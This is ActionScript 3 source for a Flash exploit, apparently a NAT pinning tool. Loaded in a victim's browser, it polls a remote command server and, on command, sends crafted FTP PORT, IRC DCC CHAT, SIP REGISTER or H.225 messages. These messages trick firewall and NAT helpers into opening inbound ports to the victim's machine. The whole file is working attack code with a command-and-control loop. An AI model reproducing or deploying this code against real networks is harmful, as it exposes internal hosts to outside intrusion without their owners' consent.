//as3compile exploit.as -o exploit.swf

package {
	import flash.display.MovieClip;
	import flash.net.Socket;
	import flash.events.*;
	import flash.system.Security;
	import flash.external.*; 
	import flash.system.Capabilities;
	import flash.utils.Timer;
	import flash.net.URLRequest;
	import flash.net.navigateToURL;
	import flash.external.ExternalInterface;
	
	public class Main extends MovieClip {
		static var socket:Socket
		static var socketCMD:Socket
		var sServer:String
		var iServerPort:int
		var sType:String
		var sCallbackPort:String
		var sCallbackIP:String
		var sClientID:String
		var sTestID:String
		var timer : Timer

      		function Main() {
			//get external vars
			sServer= root.loaderInfo.parameters.server as String;
			sType= root.loaderInfo.parameters.type as String;
			sCallbackPort = root.loaderInfo.parameters.cp as String;
			sCallbackIP = root.loaderInfo.parameters.ci as String;
			if (sType !=null){
				if (sType.toUpperCase()=="IRC"){startIRC();}
				if (sType.toUpperCase()=="FTP"){startFTP();}
				if (sType.toUpperCase()=="SIP"){startSIP();}
				if (sType.toUpperCase()=="CMD"){connectCMD(sServer);}
			}
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START COMMAND CHANNEL +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function connectCMD(server:String):void{
			socketCMD = new Socket();
			socketCMD.addEventListener(Event.CONNECT, onConnectCMD);
			socketCMD.addEventListener(Event.CLOSE, onCloseCMD);
			socketCMD.addEventListener(IOErrorEvent.IO_ERROR, onError);
			socketCMD.addEventListener(ProgressEvent.SOCKET_DATA, onResponseCMD);
			socketCMD.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socketCMD.connect(server,60003);
			
			timer = new Timer (1500);
			timer.addEventListener (TimerEvent.TIMER, sendPOLL);//send poll request every 1.5 seconds
			timer.start();
		}
		function log(data:String):void{
			try{
				trace(data);
				ExternalInterface.call("console.log", "Flash:" + data);
			} catch(e:Error){
				//ignore
			}
		}
		function sendError(error:Error):void{
			try{
				log(error.toString());
				socketCMD.writeUTFBytes("ERROR " + sClientID + error.toString().encode("base64") + "\n");
				socketCMD.flush();
			} catch (e:Error) {
				//ignore
			}
		}
		function sendPOLL(event:Event):void{
			try{
				socketCMD.writeUTFBytes("POLL " + sClientID + "\n");socketCMD.flush();
			} catch (e:Error) {
				sendError(e);
			}
		}
		function onConnectCMD(e:Event):void{
			log("Connected to Command Server")
			//socketCMD.writeUTFBytes("REG " + socketCMD.localAddress + "\n");//not supported in flash, need adobe air
			socketCMD.writeUTFBytes("REG " + sCallbackIP + "\n");
		}
		function onResponseCMD(e:ProgressEvent):void {
			try{
				if (socketCMD.bytesAvailable>0) {
					var data:String = socketCMD.readUTFBytes(socketCMD.bytesAvailable);
					data = strip(data)
					var dataparts:Array = data.split(" ");
					switch(dataparts[0]){
						case "SET":
							if (dataparts[1]=="ID"){
								sClientID = dataparts[2];
								log("Client Id = " + sClientID);
							}
							break;
						case "TEST":
							sCallbackIP = dataparts[2];
							sCallbackPort = dataparts[3];
							sTestID = dataparts[4];
							switch(dataparts[1]){
								case "FTP":
									timer.stop();
									startFTP();
									break;
								case "IRC":
									timer.stop();
									startIRC();
									break;
								case "SIP":
									timer.stop();
									startSIP();
									break;
								case "H225":
									timer.stop();
									startH225();
									break;
								default:
									log("Received invalid test protocol: " + dataparts[1]);
									break;
							}
							break;
						case "FIN":
							socketCMD.close();//todo, general cleanup of ALL open sockets
							break;
						case "RELOAD":
							//reload the current page
							var request:URLRequest = new URLRequest(loaderInfo.loaderURL);
							try {
				 				navigateToURL(request, '_blank');
							} catch (e:Error) {
								break;
							}
							break;
						case "NONE":
							//keep waiting for something to happen
							break;
						default:
							log("Invalid server command: " + data);
							break;
					}
				}
			} catch (e:Error) {
				sendError(e);
			}
		}
	
		function onCloseCMD(e:Event):void {
			// Security error is thrown if this line is excluded
			socketCMD.close();
		}
		public static function createGUID():String {
			var uid:Array = new Array();
			var chars:Array = new Array( 48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70 );
			var separator:uint = 45;
			var template:Array = new Array( 8,4,4,4,12 );
     			
			for ( var a:uint = 0; a < template.length; a++ ) {
				for ( var b:uint = 0; b < template[a]; b++ ) {
					uid.push( chars[ Math.floor( Math.random() *  chars. length ) ] );
        			}
				if ( a < template.length - 1 ) {
					//uid.push( separator );
				}
			}
     
		    return String.fromCharCode.apply( null, uid );
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ END COMMAND CHANNEL +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START FTP +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startFTP():void{
			log("Starting FTP Test for " + sCallbackIP);
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectFTP);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseFTP)
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,21);
		}
		function onConnectFTP(e:Event):void {
			log("FTP client connected to " + sServer);
		}
		function onResponseFTP(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable);
				log("FTP in: " + data);
				data = data.substr(0,3)
				if (data=="220"){socket.writeUTFBytes("USER " + sTestID + "\n");socket.flush();}
				if (data=="331"){socket.writeUTFBytes("PASS natpin@work.net\n");socket.flush();}
				//logged in
				if (data=="230"){
					var portcmd = "PORT " + sCallbackIP.split(".").join(",") + "," + calcFTPPort(int(sCallbackPort)) + "\n";
					socket.writeUTFBytes(portcmd);
					socket.flush();
					log( "FTP NatPinTest: PORT Command sent");
				}
				if (data=="200"){
					//port command succesfull, send list command
					socket.writeUTFBytes("LIST\n");
					socket.flush();
					timer.start();
				}
				if (data=="500"){
					log("FTP NatPinTest: server returned 500 message...");
					timer.start();
				}
			}
		}
		function calcFTPPort(port:int):String{
			try{
				var result:String ="";
				var x:int = port%256;
				var y:int = (port -x)/256;
				result = String(y) + "," + String(x);
				return result;
			} catch (e:Error){
				sendError(e);
			}
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START IRC +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startIRC():void{
			log("Starting IRC Test for " + sCallbackIP);
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectIRC);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseIRC)
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,6667);
		}
		function onConnectIRC(e:Event):void {
			log("IRC client connected to " + sServer);
		}
		function onResponseIRC(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable);
				// init
				if (data.indexOf("NOTICE")>0){socket.writeUTFBytes("NICK natpin\nUSER natpin natpin 127.0.0.1:natpin\n")};socket.flush()
				//end of motd
				if (data.indexOf("376")>0){socket.writeUTFBytes("PRIVMSG "+ sTestID + " :\1DCC CHAT chat "+ dot2num(sCallbackIP) +" "+ sCallbackPort+"\1\n")};socket.flush();
				timer.start();
			}
		}
		function dot2num(ip:String):String {
	    		var long:Number = 0.0;
			var num_arr:Array = ip.split(".");
			for (var i:Number = 0; i < 4; i++)
	    		{
	        		long *= 256.0;
	        		long += parseInt(num_arr[i]);
	    		}
		    return String(long);
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START SIP +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startSIP():void{
			log("Starting SIP Test for " + sCallbackIP);
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectSIP);
			socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponseSIP);
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);
			socket.connect(sServer,5060);
		}
		function onConnectSIP(e:Event):void {
			log("SIP client connected to " + sServer);
			var register:String = "REGISTER sip:$callbackip$ SIP/2.0\nCSeq: 1 REGISTER\nVia: SIP/2.0/TCP $callbackip$:$callbackport$;branch=$testid$;rport\nUser-Agent: Ekiga/3.2.5\nFrom: <sip:$clientid$@$callbackip$>;tag=d60e6131-99e1-de11-8845-080027608325\nCall-ID: e4ec6031-99e1-de11-8845-080027608325@vvt-laptop\nTo: <sip:13@10.10.1.99>\nContact: <sip:$clientid$@$callbackip$>;q=1\nAllow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING\nExpires: 3600\nContent-Length: 0\nMax-Forwards: 70\n";
			register = register.split("$callbackip$").join(sCallbackIP);
			register = register.split("$callbackport$").join(sCallbackPort);
			register = register.split("$clientid$").join(sClientID);
			register = register.split("$testid$").join(sTestID);
			socket.writeUTFBytes(register);socket.flush();
			timer.start();
		}
		function onResponseSIP(e:ProgressEvent):void {
			
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START H225 +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function startH225():void {
			socket = new Socket();
			socket.addEventListener(Event.CONNECT, onConnectH225);
			/*socket.addEventListener(ProgressEvent.SOCKET_DATA, onResponse)
			socket.addEventListener(Event.CLOSE, onClose);
			socket.addEventListener(IOErrorEvent.IO_ERROR, onError);;
			socket.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onSecError);*/
			socket.connect(sServer,1720);
			
		}
		function onConnectH225(e:Event):void {
			log("H225 client connected to " + sServer);
		}
		//+++++++++++++++++++++++++++++++++++++++++++++++++ START ALL_PROTO +++++++++++++++++++++++++++++++++++++++++++++++++++++++
		function onConnect(e:Event):void {
			log("connected")
		}

		function onClose(e:Event):void {
			// Security error is thrown if this line is excluded
			socket.close();
		}

		function onError(e:IOErrorEvent):void {
			sendError("IO Error: "+e);
		}

		function onSecError(e:SecurityErrorEvent):void {
			sendError("Security Error: "+e);
		}

		function onResponse(e:ProgressEvent):void {
			if (socket.bytesAvailable>0) {
				var data:String = socket.readUTFBytes(socket.bytesAvailable)
			}
		}

		function calcFTP(port,ip):String{
		}
		function calcIRC(port,ip):String{
		}
		function strip(val:String):String{
			var x:String = val
			x = x.split("\n").join("")
			x.split("\r").join("")
			return x
		}
	}
}
